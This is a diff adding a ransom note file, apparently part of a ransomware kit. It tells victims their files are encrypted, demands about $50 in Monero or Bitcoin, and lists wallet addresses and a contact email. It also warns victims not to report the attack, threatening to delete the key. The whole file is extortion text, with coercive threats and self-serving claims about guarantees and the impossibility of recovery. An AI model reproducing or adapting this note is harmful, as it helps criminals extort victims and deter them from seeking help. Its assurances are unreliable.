@@ -1,0 +1,48 @@
+What happend?
+----------------------------------------------
+All Your files has been succesfully encrypted by  due to security problem with Your PC.
+
+Can I get My files back?
+----------------------------------------------
+Sure! But You need special decryptor for that.
+If You want to recover Your files, you need to cooperate.
+
+What can I do to get my files back?
+----------------------------------------------
+You can buy my decryption software, this software will allow you to recover all of your data and remove the ransomware from your computer.
+The price for the software is about 50$ (USD). Payment can be made in Monero, or Bitcoin (Cryptocurrency) only.
+
+What guarantees?
+----------------------------------------------
+I value my reputation. If i do not do my work and liabilities, nobody will pay me. This is not in my interests.
+All my decryption software is perfectly tested and will decrypt your data.
+
+How do I pay, where do I get Monero or Bitcoin?
+----------------------------------------------
+Purchasing Monero or Bitcoin varies from country to country, you are best advised to do a quick Google search
+yourself to find out how to buy Monero or Bitcoin.
+You have to pay 50$ in Bitcoin or in Monero.
+
+Where i can pay?
+----------------------------------------------
+Monero Address:
+48CEU93NRDqCmH3qfksLRLeQJ9mjbFCUXEyZkStiRDWtDod mAtd7voHF1sHa17MgmoYmMoErrJstV6nC1DqYoKxT38r6TUh
+Bitcoin Addres:
+bc1qpjftnrmahzc8cjs23snk2rq0vt6l0ehu4gqxus
+
+Contact
+----------------------------------------------
+After payment contact:
+astralocker2@tutanota.com
+and send Your personal ID with transaction ID (if you are paying with Bitcoin)
+
+Warning! If you report these emails, they may be suspended and NOBODY gets help.
+It is in Your INTEREST to get the decryptor.
+
+Your personal ID is:
+-
+
+1)Don't change the extension of the files. You will harm the files.
+2)Dont move encrypted files.
+3)Don't try to recover files by Yourself. This is impossible. Your files are encrypted with Curve25519 encryption algorithm, You can't decrypt files without private key.
+4)Report to authoritaries. If You do it, key will be deleted, and Your files will be encrypted forever.
